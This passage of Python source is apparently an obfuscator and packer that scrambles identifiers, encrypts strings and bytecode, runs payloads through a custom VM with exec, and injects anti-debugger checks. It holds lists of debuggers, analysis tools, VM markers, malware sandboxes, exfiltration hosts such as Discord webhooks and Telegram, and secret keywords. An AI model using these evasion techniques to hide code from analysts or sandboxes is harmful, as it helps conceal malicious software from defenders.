# -*- coding: utf-8 -*-
import sys,os,random,marshal,zlib,lzma,bz2,gzip,base64,hashlib,ast,time,string,secrets,io,re,warnings
warnings.filterwarnings('ignore',category=SyntaxWarning)
try:from cryptography.hazmat.primitives.ciphers.aead import AESGCM,ChaCha20Poly1305;_CRYPTO=True
except:_CRYPTO=False
if sys.version_info<(3,9) or sys.version_info>=(3,14):print("Python 3.9-3.13 required");sys.exit(1)
class 凱:
    def __init__(凱_):
        凱_._r=secrets.SystemRandom();凱_._p=[chr(i)for r in[(0x4e00,0x9faf),(0x3400,0x4dbf),(0x0391,0x03c9),(0xac00,0xacff),(0x3040,0x30ff),(0x0400,0x04ff),(0x0980,0x09ff),(0x0a00,0x0a7f),(0x0b00,0x0b7f),(0x0c00,0x0c7f),(0x0d00,0x0d7f),(0x0e00,0x0e7f),(0x10a0,0x10ff),(0x1200,0x137f),(0x13a0,0x13ff),(0x1400,0x167f),(0x1680,0x169f),(0x16a0,0x16ff),(0x1700,0x171f),(0x1780,0x17ff),(0x1800,0x18af),(0x1e00,0x1eff),(0x1f00,0x1fff),(0x2c00,0x2c5f),(0x2d00,0x2d2f),(0xa000,0xa48f),(0xa500,0xa63f),(0xa800,0xa82f),(0x1000,0x109f),(0x0f00,0x0fff),(0xaa00,0xaa5f),(0x0900,0x097f),(0xa980,0xa9df),(0x1b00,0x1b7f)]for i in range(r[0],r[1])if chr(i).isidentifier()]
        凱_._DBG=['ida','ida64','idaq','idaq64','x64dbg','x32dbg','ollydbg','windbg','cdb','ntsd','kd','ghidra','frida','cheatengine','cheat engine','ce-','dnspy','dotpeek','ilspy','immunity','radare','r2','gdb','lldb','edb','hopper','binaryninja','cutter']
        凱_._ANZ=['procmon','procmon64','procexp','procexp64','wireshark','fiddler','charles','mitmproxy','burp','processhacker','process hacker','apimonitor','httpdebuggerpro','tcpview','regmon','filemon','autoruns','pestudio','die','peid','exeinfope','scylla','lordpe','petools','resourcehacker','hxd','010editor']
        凱_._VM=['vmtoolsd','vmwaretray','vmwareuser','vgauthservice','vmacthlp','vboxservice','vboxtray','sandboxie','vmsrvc','vmusrvc','xenservice','qemu-ga','qemu','hyperv','virtualbox','prl_tools','prl_cc','joeboxserver','joeboxcontrol']
        凱_._CMD=['tasklist','wmic','netstat','handle','listdlls','strings','dumpbin','objdump','nm ','readelf','strace','ltrace','scanmem','artmoney','gameguardian']
        凱_._HOST=['discord.com','discordapp.com','webhook.site','api.telegram.org','telegram.org','pastebin.com','hastebin.com','transfer.sh','api.ipify.org','ip-api.com','ngrok.io','ngrok.app','pipedream.net','raw.githubusercontent.com','file.io']
        凱_._KEY=['token','password','cookie','session','auth','credit','card','api_key','apikey','bearer','credential','license','webhook','private','secret']
        凱_._INJ=['inject','hook','patch','debug','reverse','spy','monitor','trace','decompile','dump','scan','attach','detach','httptoolkit','http-toolkit','frida','objection','xposed','substrate','mitmproxy','burp','fiddler','charles','proxifier','interceptor']
        凱_._DECOMP=['uncompyle6','decompyle3','pycdc','unpyc','pycparser','astor','uncompyle2','easy_python_decompiler','uncompyle','pyc2py']
        凱_._VM_MAC=['00:05:69','00:0c:29','00:1c:14','00:50:56','08:00:27','52:54:00','00:21:f6','00:14:4f','00:15:5d','00:1c:42','00:03:ff','00:0f:4b','00:16:3e','02:42:ac','02:00:17']
        凱_._SBX=['sandbox','virus','malware','sample','analysis','cuckoo','any.run','hybrid','joe','cape','triage','hatching','intezer']
    def 霧int(凱_,*a):v=a[0];m=凱_._r.randint(1,2147483647);return f"(({v}^{m})^{m})"
    # name
    def α(凱_,*a,**k):
        n=k.get('n',a[0]if a else 4);t=k.get('t',False);heavy=k.get('heavy',False);compact=k.get('compact',False);clean=k.get('clean',False)
        n=凱_._r.randint(max(2,n),max(5,n));r=凱_._r;p=凱_._p;inv=['\u200b','\u200c','\ufeff','\u2060','\u180e']
        if compact:
             return chr(r.randint(0x4e00,0x9fff))
        if clean:
             name=''.join(chr(r.randint(0x4e00,0x9fff))for _ in range(n))
             return name
        if heavy:
             name=''.join(r.choice(p)+r.choice(inv) for _ in range(n))
        else:
             name=''.join(r.choice(p)+r.choice(inv) for _ in range(n))
        name=name if name.isidentifier()else''.join(r.choice(p)for _ in range(n))
        if not t:return name
        trap=f"(lambda __={name}:(((__,),)[0],[__][0],{{True:__}}[True],(lambda ___=__:___)(),locals().get('{name}', __),vars().get('{name}', __),globals().get('{name}', __)) and __)()"
        return name,trap
    # lambda
    def λ(凱_,*a,**k):
        n=k.get('n',a[0]if a else None);v=k.get('v',a[2]if len(a)>2 else(a[1]if len(a)>1 else "None"))
        n=n or 凱_._r.randint(2,4);α=凱_.α
        for _ in range(n):
            a,b,c,d,e,f,g,h,i,j,k,l=α(2),α(2),α(2),α(2),α(2),α(2),α(2),α(2),α(2),α(2),α(2),α(2);cn=α(4)
            v=f"(lambda {a}=(lambda {b}:{b}({b})),{c}=type('{cn}',(object,),{{'__call__':lambda {d},{e}:(lambda {f}:{f})(((lambda {g}:(lambda {h}:{h})({g}))({e}),)[0]),'__repr__':lambda {d}:'{cn}','__bool__':lambda {d}:True}}),{i}=(lambda {j}:(lambda {k}:(lambda {l}:{l})({k}))({j})):{a}(lambda {a}:lambda {b}:{c}()({i}({v})))(())) ()"
        return v
    # strings
    def 霧(凱_,tree):
        import zlib,marshal,struct
        is_str_input=isinstance(tree,str)
        if is_str_input:tree=ast.parse(tree)
        def poly_blob(blob):
            k1=凱_._r.randint(1,255);k2=凱_._r.randint(1,255)
            enc=bytes(((b^k1)+k2)&0xFF for b in blob)
            v_b=凱_.α(compact=True)
            chunks=[enc[i:i+100]for i in range(0,len(enc),100)]
            joined=ast.BinOp(left=ast.Constant(value=chunks[0]),op=ast.Add(),right=ast.Constant(value=chunks[1])) if len(chunks)>1 else ast.Constant(value=chunks[0])
            for c in chunks[2:]:joined=ast.BinOp(left=joined,op=ast.Add(),right=ast.Constant(value=c))
            lam=ast.parse(f"(lambda: bytes((({v_b} - {k2}) & 0xFF) ^ {k1} for {v_b} in {v_b}_data))()").body[0].value
            for node in ast.walk(lam):
                if isinstance(node,ast.comprehension)and isinstance(node.iter,ast.Name)and node.iter.id==f"{v_b}_data":node.iter=joined
            return lam
        strs=[];str_map={}
        class PreProcessor(ast.NodeTransformer):
            def visit_JoinedStr(self,node):
                try:
                    fmt_parts=[];args=[]
                    for part in node.values:
                        if isinstance(part,ast.Constant)and isinstance(part.value,str):fmt_parts.append(part.value.replace('{','{{').replace('}','}}'))
                        elif isinstance(part,ast.FormattedValue):fmt_parts.append('{}');args.append(self.visit(part.value))
                    return ast.Call(func=ast.Attribute(value=ast.Constant(value=''.join(fmt_parts)),attr='format',ctx=ast.Load()),args=args,keywords=[])
                except:return node
            def visit_Attribute(self,node):
                self.generic_visit(node)
                if isinstance(node.ctx,ast.Load):return ast.Call(func=ast.Name(id='getattr',ctx=ast.Load()),args=[node.value,ast.Constant(value=node.attr)],keywords=[])
                return node
            def visit_Assign(self,node):
                self.generic_visit(node)
                if len(node.targets)==1 and isinstance(node.targets[0],ast.Attribute):
                    target=node.targets[0]
                    if isinstance(target.ctx,ast.Store):return ast.Expr(value=ast.Call(func=ast.Name(id='setattr',ctx=ast.Load()),args=[target.value,ast.Constant(value=target.attr),node.value],keywords=[]))
                return node
            def visit_Call(self,node):
                self.generic_visit(node)
                new_keywords=[]
                for kw in node.keywords:
                    if kw.arg is not None:new_keywords.append(ast.keyword(arg=None,value=ast.Dict(keys=[ast.Constant(value=kw.arg)],values=[kw.value])))
                    else:new_keywords.append(kw)
                node.keywords=new_keywords
                return node
        tree=PreProcessor().visit(tree);ast.fix_missing_locations(tree)
        for n in ast.walk(tree):
             if isinstance(n,ast.Constant)and isinstance(n.value,(str,bytes)):
                if n.value not in str_map:str_map[n.value]=len(strs);strs.append(n.value)
        if not strs:
             if is_str_input:return ast.unparse(tree)
             return tree
        raw=marshal.dumps(strs);comp=zlib.compress(raw)
        master_k1=凱_._r.randint(1,255);master_k2=凱_._r.randint(1,255)
        master_blob=bytes(((b+master_k1)&0xFF)^master_k2 for b in comp)
        dec_name=凱_.α(compact=True);blob_name=凱_.α(compact=True);zlib_name=凱_.α(compact=True);marshal_name=凱_.α(compact=True)
        zlib_imp=ast.Call(func=ast.Name(id='__import__',ctx=ast.Load()),args=[ast.Constant(value='zlib')],keywords=[])
        marshal_imp=ast.Call(func=ast.Name(id='__import__',ctx=ast.Load()),args=[ast.Constant(value='marshal')],keywords=[])
        dec_src=f"""def {dec_name}(idx):
    global {blob_name}
    try:
        if isinstance({blob_name},bytes):
            {zlib_name}=__import__('zlib');{marshal_name}=__import__('marshal')
            _t=bytes((({blob_name}[i]^{master_k2})-{master_k1})&0xFF for i in range(len({blob_name})))
            {blob_name}={marshal_name}.loads({zlib_name}.decompress(_t))
        return {blob_name}[idx]
    except:return ''"""
        dec_ast=ast.parse(dec_src).body[0]
        chunk_size=50000;chunks=[master_blob[i:i+chunk_size]for i in range(0,len(master_blob),chunk_size)]
        if len(chunks)>1:
            concat=ast.BinOp(left=ast.Constant(value=chunks[0]),op=ast.Add(),right=ast.Constant(value=chunks[1]))
            for c in chunks[2:]:concat=ast.BinOp(left=concat,op=ast.Add(),right=ast.Constant(value=c))
            blob_assign=ast.Assign(targets=[ast.Name(id=blob_name,ctx=ast.Store())],value=concat)
        else:blob_assign=ast.Assign(targets=[ast.Name(id=blob_name,ctx=ast.Store())],value=ast.Constant(value=master_blob))
        verify_name=凱_.α(compact=True);verify_data=bytes(凱_._r.randint(0,255)for _ in range(凱_._r.randint(50,100)))
        verify_blob=poly_blob(verify_data);verify_assign=ast.Assign(targets=[ast.Name(id=verify_name,ctx=ast.Store())],value=verify_blob)
        for n in ast.walk(tree):
            for k,v in list(ast.iter_fields(n)):
                if isinstance(v,list):
                    for i,item in enumerate(v):
                        if isinstance(item,ast.Constant)and isinstance(item.value,(str,bytes)):
                            if item.value in str_map:
                                idx=str_map[item.value];noise=凱_._r.randint(1,100)
                                call=ast.Call(func=ast.Name(id=dec_name,ctx=ast.Load()),args=[ast.BinOp(left=ast.Constant(value=idx+noise),op=ast.Sub(),right=ast.Constant(value=noise))],keywords=[])
                                v[i]=call
                elif isinstance(v,ast.Constant)and isinstance(v.value,(str,bytes)):
                     if v.value in str_map:
                         idx=str_map[v.value];noise=凱_._r.randint(1,100)
                         call=ast.Call(func=ast.Name(id=dec_name,ctx=ast.Load()),args=[ast.BinOp(left=ast.Constant(value=idx+noise),op=ast.Sub(),right=ast.Constant(value=noise))],keywords=[])
                         setattr(n,k,call)
        adler_val=zlib.adler32(verify_data);crc_val=zlib.crc32(verify_data)
        check_ast=ast.If(test=ast.Compare(left=ast.BinOp(left=ast.Call(func=ast.Attribute(value=zlib_imp,attr='crc32',ctx=ast.Load()),args=[ast.Name(id=verify_name,ctx=ast.Load())],keywords=[]),op=ast.Add(),right=ast.Call(func=ast.Attribute(value=zlib_imp,attr='adler32',ctx=ast.Load()),args=[ast.Name(id=verify_name,ctx=ast.Load())],keywords=[])),ops=[ast.NotEq()],comparators=[ast.Constant(value=crc_val+adler_val)]),body=[ast.Expr(value=ast.Call(func=ast.Attribute(value=marshal_imp,attr='dumps',ctx=ast.Load()),args=[ast.Constant(value=1)],keywords=[])),ast.Expr(value=ast.Call(func=ast.Name(id='exit',ctx=ast.Load()),args=[ast.Constant(value=1)],keywords=[]))],orelse=[])
        if isinstance(tree,ast.Module):tree.body.insert(0,blob_assign);tree.body.insert(1,dec_ast);tree.body.insert(2,verify_assign);tree.body.insert(3,check_ast)
        elif hasattr(tree,'body'):tree.body.insert(0,blob_assign);tree.body.insert(1,dec_ast);tree.body.insert(2,verify_assign);tree.body.insert(3,check_ast)
        ast.fix_missing_locations(tree);return tree

    # encrypt
    def χ(凱_,d,k=None):
        d=bytes(a^k[i%len(k)]for i,a in enumerate(d))
        if _CRYPTO:n=凱_._r.randbytes(12);d=n+凱_._r.choice([AESGCM,ChaCha20Poly1305])(k[:32]).encrypt(n,d,None)
        s,j,r=list(range(256)),0,[]
        for i in range(256):j=(j+s[i]+k[i%len(k)])%256;s[i],s[j]=s[j],s[i]
        i=j=0
        for b in d:i=(i+1)%256;j=(j+s[i])%256;s[i],s[j]=s[j],s[i];r.append(b^s[(s[i]+s[j])%256])
        return bytes(r)
    # compress
    def μ(凱_,d):
        from concurrent.futures import ThreadPoolExecutor
        def _c(args):f,i=args;return(f(d),i)
        with ThreadPoolExecutor(3) as e:c=list(e.map(_c,[(lambda x:lzma.compress(x,preset=9),0),(lambda x:bz2.compress(x,compresslevel=9),1),(lambda x:gzip.compress(x,compresslevel=9),2)]))
        c.sort(key=lambda x:len(x[0]));return bytes([c[0][1]])+c[0][0]
    # vm
    def 虛(凱_,payload,key,extra_vars=None,with_clear=False):
        try:
             if isinstance(payload,str):payload=ast.unparse(凱_.霧(ast.parse(payload)))
        except:pass
        import string
        _used_names = set()
        import keyword
        def rnd_name():
            while True:
                n = ''.join(凱_._r.choices(string.ascii_letters, k=6))
                if n not in _used_names and not keyword.iskeyword(n): _used_names.add(n); return n
        α = rnd_name
        r=凱_._r;_H=lambda s:"'"+''.join(f"\\x{ord(c):02x}"for c in s)+"'"
        all_ops=list(range(256));r.shuffle(all_ops)
        log_ops=['lx','ex','st','ad','sb','ml','rt','dp','sw','np','at','pp','rv','ck','jp','cl','sl','sr','nt','md','an','or','li','jp','mo','jz','jnz','su','gh','d2','r3','s2','cs','mu','ab','xo','ai','si','mi']
        op_map={k:[] for k in log_ops}
        for i,op_val in enumerate(all_ops):op_map[log_ops[i%len(log_ops)]].append(op_val)
        def get_Op(tag):return r.choice(op_map[tag])

        vm_key=r.randint(1,255);rolling_seed=r.randint(11,99)|1;rolling_mult=5
        xor_layer2=r.randint(1,255);xor_layer3=r.randint(1,255);su_val=r.randint(1,255)
        enc_body=[];curr_k=vm_key
        for c in payload:enc_body.append((ord(c)^curr_k^xor_layer2^xor_layer3));curr_k=((curr_k*rolling_mult)+rolling_seed)%256

        v_vm,v_stk,v_bc,v_dt,v_k,v_x2,v_x3=α(),α(),α(),α(),α(),α(),α()
        v_h,v_tmp,v_res,v_int,v_anti=α(),α(),α(),α(),α()
        v_ip,v_rk,v_fk,v_ghost,v_prev=α(),α(),α(),α(),α()
        rk_seed=r.randint(1000,9999);rk_mult=r.randint(100,999)|1;rk_add=r.randint(100,999)
        
        _sys,_ct,_os,_tr,_pr,_ex,_imp,_bui,_dic=_H('sys'),_H('ctypes'),_H('os'),_H('gettrace'),_H('getprofile'),_H('_exit'),_H('__import__'),_H('__builtins__'),_H('__dict__')
        check_pool = [
             "pass",
             f"if getattr(__import__({_ct}).windll.kernel32,{_H('IsDebuggerPresent')})():getattr(__import__({_os}),{_ex})(1)" if __import__('os').name=='nt' else "pass",
             f"{v_tmp}= getattr(__import__({_ct}),{_H('c_int')})(0);getattr(__import__({_ct}).windll.kernel32,{_H('CheckRemoteDebuggerPresent')})(getattr(__import__({_ct}).windll.kernel32,{_H('GetCurrentProcess')})(),getattr(__import__({_ct}),{_H('byref')})({v_tmp}));getattr(__import__({_os}),{_ex})(1) if {v_tmp}.value else None" if __import__('os').name=='nt' else "pass"
        ]
        chosen_check = "\n  ".join(check_pool)
        
        target_key = vm_key
        import random as _rr
        ops = [('ad', lambda x,y: (((x&0xFF)^(y&0xFF))+2*((x&0xFF)&(y&0xFF)))&0xFF), ('sb', lambda x,y: (((x&0xFF)^((256-y)&0xFF))+2*((x&0xFF)&((256-y)&0xFF)))&0xFF), ('ml', lambda x,y: (x*y)%256), ('su', lambda x,y: (x+y+su_val)%256)]
        
        current_val = _rr.randint(1, 255)
        calc_ops = [get_Op('li'), current_val]
        
        steps = _rr.randint(8, 12)
        for _ in range(steps):
             op_name, op_func = _rr.choice(ops)
             val = _rr.randint(1, 255)
             if op_name == 'ad': calc_ops.extend([get_Op('ai'), val])
             elif op_name == 'sb': calc_ops.extend([get_Op('si'), val])
             elif op_name == 'ml': calc_ops.extend([get_Op('mi'), val])
             else: calc_ops.extend([get_Op('li'), val, get_Op(op_name)])
             current_val = op_func(current_val, val)
             
             calc_ops.append(get_Op('np'))
             calc_ops.extend([get_Op('li'), _rr.randint(1,255), get_Op('pp')])
             
             calc_ops.append(get_Op('gh'))

             if True:
                 dead_block = [get_Op('li'), _rr.randint(0,255), get_Op('ml'), get_Op('pp'), get_Op('np')]
                 skip_len = len(dead_block)
                 calc_ops.extend([get_Op('li'), 1, get_Op('li'), skip_len, get_Op('jnz')])
                 calc_ops.extend(dead_block)
             dead_block3 = [get_Op('li'), _rr.randint(0,255), get_Op('li'), _rr.randint(0,255), get_Op('or'), get_Op('li'), _rr.randint(0,3), get_Op('sl'), get_Op('pp'), get_Op('d2'), get_Op('pp'), get_Op('pp')]
             skip_len3 = len(dead_block3)
             calc_ops.extend([get_Op('li'), 1, get_Op('li'), skip_len3, get_Op('jnz')])
             calc_ops.extend(dead_block3)
             dead_block2 = [get_Op('li'), _rr.randint(0,255), get_Op('li'), _rr.randint(0,255), get_Op('xo'), get_Op('li'), _rr.randint(0,255), get_Op('an'), get_Op('pp'), get_Op('np')]
             skip_len2 = len(dead_block2)
             calc_ops.extend([get_Op('li'), 1, get_Op('li'), skip_len2, get_Op('jnz')])
             calc_ops.extend(dead_block2)

        adjustment = (target_key - current_val) % 256
        calc_ops.extend([get_Op('li'), adjustment, get_Op('ad'), get_Op('st')])
        
        final_dead = [get_Op('li'), _rr.randint(0,255), get_Op('ad'), get_Op('cl')]
        skip_final = len(final_dead)
        calc_ops.extend([get_Op('li'), 0, get_Op('li'), skip_final, get_Op('jz')])
        calc_ops.extend(final_dead)
        
        raw_bc = calc_ops + [get_Op('at'),get_Op('np'),get_Op('lx'),get_Op('dp'),get_Op('pp'),get_Op('at'),get_Op('at'),get_Op('ck'),get_Op('ex')]
        
        bc_checksum = 0
        for b in raw_bc:
            bc_checksum = (bc_checksum + b * 31) & 0xFFFFFFFF
        
        enc_bc = []
        for i, b in enumerate(raw_bc):
             k = ((rk_seed + i * rk_mult + rk_add) & 0xFF)
             enc_bc.append(b ^ k)
        
        junk_ops=';'.join([f'{α()}={r.randint(1000,9999)}' for _ in range(3)])

        vm_src=f"""{extra_vars if extra_vars else ""}
{junk_ops}
def {v_anti}():
 try:
  {chosen_check}
 except:pass
{v_anti}()
def {v_vm}({v_bc},{v_dt}):
 try:
  {v_stk}=[];{v_k}=[{v_dt}[1]];{v_x2}={xor_layer2};{v_x3}={xor_layer3};{v_int}=[0];{v_ip}=[0]
  {v_rk}=[{rk_seed}];{v_fk}=[];{v_ghost}=[];{v_prev}=[0]
  def _fetch():
   if {v_ip}[0] >= len({v_bc}): return 0
   k=(({v_rk}[0] + {v_ip}[0] * {rk_mult} + {rk_add}) & 0xFF)
   v=({v_bc}[{v_ip}[0]] ^ k) & 0xFF
   {v_ip}[0]+=1
   return v
  def _lx():
   {v_stk}.append({v_dt}[2])
   {v_res}=[]
   for x in {v_stk}.pop():
    {v_res}.append(chr(((x^{v_k}[0])^{v_x2})^{v_x3}));{v_k}[0]=(({v_k}[0]*{rolling_mult})+{rolling_seed})%256
   {v_stk}.append("".join({v_res}))
  _ex_n={_H('exec')};_gl_n={_H('globals')};_ge_n={_H('get')};_b=__builtins__
  _e=_b.get(_ex_n) if hasattr(_b,_ge_n) else getattr(_b,_ex_n)
  _g=_b.get(_gl_n) if hasattr(_b,_ge_n) else getattr(_b,_gl_n)
  def _ex():{v_anti}();_e({v_stk}.pop(),_g())
  def _at():{v_anti}();{v_int}[0]+=1
  def _dp():{v_stk}.append({v_stk}[-1])if {v_stk} else None
  def _sw():{v_stk}[-1],{v_stk}[-2]={v_stk}[-2],{v_stk}[-1]
  def _rt():{v_stk}.insert(0,{v_stk}.pop())if len({v_stk})>1 else None
  def _st():{v_k}[0]={v_stk}.pop()&0xFF
  def _ad():b={v_stk}.pop();a={v_stk}.pop();{v_stk}.append((((a&0xFF)^(b&0xFF))+2*((a&0xFF)&(b&0xFF)))&0xFF)
  def _sb():b={v_stk}.pop();a={v_stk}.pop();nb=(256-b)&0xFF;{v_stk}.append((((a&0xFF)^nb)+2*((a&0xFF)&nb))&0xFF)
  def _ml():b={v_stk}.pop();a={v_stk}.pop();{v_stk}.append((a*b)%256)
  def _li():{v_stk}.append(_fetch())
  def _jp():{v_ip}[0]+={v_stk}.pop()
  def _jz():o={v_stk}.pop();{v_ip}[0]+=o if {v_stk}.pop()==0 else 0
  def _jnz():o={v_stk}.pop();{v_ip}[0]+=o if {v_stk}.pop()!=0 else 0
  def _mo():v={v_stk}.pop();a={v_stk}.pop();{v_bc}[a]=v
  def _cl():{v_stk}.clear()
  def _np():
   {v_fk}.append({r.randint(0,255)});{v_ghost}.append({r.randint(0,255)})
   if len({v_fk})>8:{v_fk}.pop(0)
   if len({v_ghost})>8:{v_ghost}.pop(0)
  def _pp():{v_stk}.pop()if {v_stk} else None
  def _rv():{v_stk}.reverse()
  def _ck():{v_int}[0]<3 and getattr(__import__({_os}),{_ex})(1)if not globals().get('__aegis_corrupt__')else None
  def _md():b={v_stk}.pop();a={v_stk}.pop();{v_stk}.append(a%b)
  def _an():b={v_stk}.pop();a={v_stk}.pop();{v_stk}.append(a&b)
  def _or():b={v_stk}.pop();a={v_stk}.pop();{v_stk}.append(a|b)
  def _nt():{v_stk}.append(not {v_stk}.pop())
  def _sl():b={v_stk}.pop();a={v_stk}.pop();{v_stk}.append(a<<b)
  def _sr():b={v_stk}.pop();a={v_stk}.pop();{v_stk}.append(a>>b)
  def _su():b={v_stk}.pop();a={v_stk}.pop();{v_stk}.append((a+b+{su_val})%256)
  def _gh():{v_stk}.insert(len({v_stk})//2,{v_ghost}.pop() if {v_ghost} else {r.randint(0,255)});{v_stk}.pop(0)
  def _d2():{v_stk}.extend({v_stk}[-2:])if len({v_stk})>=2 else None
  def _r3():{v_stk}[-3],{v_stk}[-2],{v_stk}[-1]={v_stk}[-1],{v_stk}[-3],{v_stk}[-2] if len({v_stk})>=3 else None
  def _s2():{v_stk}[-4],{v_stk}[-3],{v_stk}[-2],{v_stk}[-1]={v_stk}[-2],{v_stk}[-1],{v_stk}[-4],{v_stk}[-3] if len({v_stk})>=4 else None
  def _cs():_c=sum({v_stk})&0xFFFF;{v_stk}.append(_c&0xFF);{v_stk}.append((_c>>8)&0xFF)
  def _mu():_i={v_stk}.pop()%len({v_bc});{v_bc}[_i]=({v_bc}[_i]+{v_stk}.pop())&0xFF if len({v_stk})>=1 else None
  def _xo():b={v_stk}.pop();a={v_stk}.pop();{v_stk}.append(a^b)
  def _ab():{v_anti}();{v_stk}.append({r.randint(1,255)})
  def _ai():v=_fetch();a={v_stk}.pop();{v_stk}.append((((a&0xFF)^(v&0xFF))+2*((a&0xFF)&(v&0xFF)))&0xFF)
  def _si():v=_fetch();a={v_stk}.pop();nb=(256-v)&0xFF;{v_stk}.append((((a&0xFF)^nb)+2*((a&0xFF)&nb))&0xFF)
  def _mi():v=_fetch();a={v_stk}.pop();{v_stk}.append((a*v)%256)
  {v_h}={{}}
  def _reg(tag, real, op_list):
   _f = [
    lambda: ({v_fk}.append({r.randint(0,255)}), {v_ghost}.append({r.randint(0,255)})),
    lambda: {v_stk}.append({v_stk}[-1]) if {v_stk} else None,
    lambda: {v_fk}.pop(0) if {v_fk} else None,
     lambda: {v_fk}.append(len({v_stk})) or None,
     lambda: {v_fk}.reverse() or None,
    lambda: {v_ghost}.pop() if {v_ghost} else None,
    lambda: {v_ghost}.append({v_stk}[-1]&0xFF) if {v_stk} else None,
    lambda: ({v_int}[0],{v_prev}[0])
   ]
   _t = (({v_dt}[1] ^ {rk_seed}) % 9)
   _f.insert(_t, real)
   for _op in op_list: {v_h}[_op] = _f[_t]
"""
        for tag in log_ops:
            vm_src += f"  _reg('{tag}', _{tag.lower()}, {op_map[tag]})\n"
        
        vm_src += f"""  _cs=0;_prev=0
  for _i in range(len({v_bc})):
   _dk=(({v_rk}[0]+_i*{rk_mult}+{rk_add})&0xFF)
   _cs=(_cs+({v_bc}[_i]^_dk)*31)&0xFFFFFFFF
  if _cs!={v_dt}[3]:getattr(__import__({_os}),{_ex})(1)
  while {v_ip}[0]<len({v_bc}):
   _cur = {v_ip}[0]
   {v_tmp}=_fetch()

   {v_bc}[_cur] = {r.randint(0,255)}
   {v_h}.get({v_tmp},_np)()
 except:pass
{v_vm}({enc_bc},{{1:{vm_key},2:{enc_body},3:{bc_checksum},4:{su_val}}})"""
        if extra_vars:vm_src=extra_vars+'\n'+vm_src
        vm_src=ast.unparse(凱_.霧(ast.parse(vm_src)))
        return vm_src,enc_body,vm_key,rolling_seed,rolling_mult
    # minify
    def ζ(凱_,code):
        try:
            tree=ast.parse(code)
            for n in ast.walk(tree):
                if isinstance(n,(ast.FunctionDef,ast.ClassDef,ast.AsyncFunctionDef,ast.Module)):
                    if n.body and isinstance(n.body[0],ast.Expr)and isinstance(n.body[0].value,ast.Constant)and isinstance(n.body[0].value.value,str):n.body.pop(0)
            return ast.unparse(tree)
        except:return code
    # speed
    def 雷(凱_,code):
        try:
            tree=ast.parse(code);ast.fix_missing_locations(tree)
            c=compile(tree,'<aegis>','exec',optimize=2,dont_inherit=True)
            m=marshal.dumps(c)
            depth=凱_._r.randint(2,4)
            for _ in range(depth):
                k=凱_._r.randbytes(32)
                m=bytes(b^k[i%32]for i,b in enumerate(m))
                m=marshal.dumps((k,m))
            return m,hashlib.sha256(marshal.dumps(c)).hexdigest(),depth
        except:
            c=compile(code,'<aegis>','exec')
            m=marshal.dumps(c);h=hashlib.sha256(m).hexdigest()
            k=凱_._r.randbytes(32)
            m=bytes(b^k[i%32]for i,b in enumerate(m))
            return marshal.dumps((k,m)),h,1
    # junk
    def 闘(凱_):
        _=凱_.α;L=凱_.λ;r=凱_._r;sp=''.join(chr(r.randint(0x4e00,0x9fff))for _ in range(30))
        a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,s,t,u,v,w=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        cn,cn2,cn3=_(5),_(5),_(5)
        t1,tr1=_(t=True);t2,tr2=_(t=True);t3,tr3=_(t=True)
        return f'''{a}=lambda:None;{b}={L(v='None')};type('{c}',(),{{}});{d}="{sp}";{e}=lambda:{L(v=f'{d}[::-1]')}
{f}=[{e}()for _ in range(5)];{g}={{ii:(lambda ii=ii:{d}[ii%len({d})])for ii in range(20)}};{h}=[{g}[ii]()for ii in range(20)]
{t1}=lambda:None;{tr1}
class {cn}:
    __slots__=('{i}','{j}','{k}')
    def __init__({l},{m}=None):{l}.{i}={m} or "{sp[:15]}";{l}.{j}={{kk:(lambda kk=kk:kk*kk)for kk in range(10)}};{l}.{k}=[{l}.{j}[kk]()for kk in range(10)]
    def {n}({l},{o}):{p}=[{l}.{i}[ii%len({l}.{i})]for ii in range({o})];return ''.join({p})
    def __repr__({l}):return {L(v=f'"{sp[:10]}"')}
    def __hash__({l}):return id({l})^{r.randint(1000,9999)}
{q}={cn}()
{s}=lambda {t}:(lambda {u}=(lambda {v}:{v}*{v}):{u}({t})+{u}({t}//2))()
{t2}={L()};{tr2}
def {i}({j}):
    if {j}<=1:return {j}
    _a,_b=0,1
    for _ in range({j}-1):_a,_b=_b,_a+_b
    return _b
{w}={{kk:{s}(kk)for kk in range(15)}}
{t3}="{sp[:20]}";{tr3}
{L()}
'''
    # init
    def 初(凱_):
        _=凱_.α;r=凱_._r;sp=''.join(chr(r.randint(0x4e00,0x9fff))for _ in range(30));m1,m2,m3,m4=r.randint(10**85,10**95),r.randint(10**75,10**85),r.randint(10**65,10**75),r.randint(10**55,10**65);k1,k2,k3,k4,k5,k6,k7,k8=r.randint(1,255),r.randint(1,255),r.randint(1,255),r.randint(1,255),r.randint(1,255),r.randint(1,255),r.randint(1,255),r.randint(1,255);base=r.randint(200,800);salt=''.join(chr(r.randint(0x3040,0x30ff))for __ in range(15));junk1,junk2,junk3=r.randint(10**20,10**30),r.randint(10**15,10**25),r.randint(10**10,10**20)
        a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,s,t,u,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,aa,ab,ac,ad,ae,af,ag,ah,ai,aj,ak,al,am,an,ao,ap,aq,ar,ba,bb,bc,bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        fk=['try','except','print','input','eval','exec','open','import','for','while','class','def','return','lambda','global','assert','raise','pass','yield','from','as','with','if','elif','else','and','or','not','in','is','True','False','None']
        invk=[f"{kw}\u1160{_()}" for kw in fk]
        invk0,invk1,invk2,invk3,invk4,invk5,invk6,invk7,invk8,invk9,invk10,invk11,invk12,invk13,invk14,invk15=invk[0],invk[1],invk[2],invk[3],invk[4],invk[5],invk[6],invk[7],invk[8],invk[9],invk[10],invk[11],invk[12],invk[13],invk[14],invk[15]
        out=f'''try:
    class {a}(eval("Exception")):
        __slots__=('{b}','{c}','{d}','{ba}')
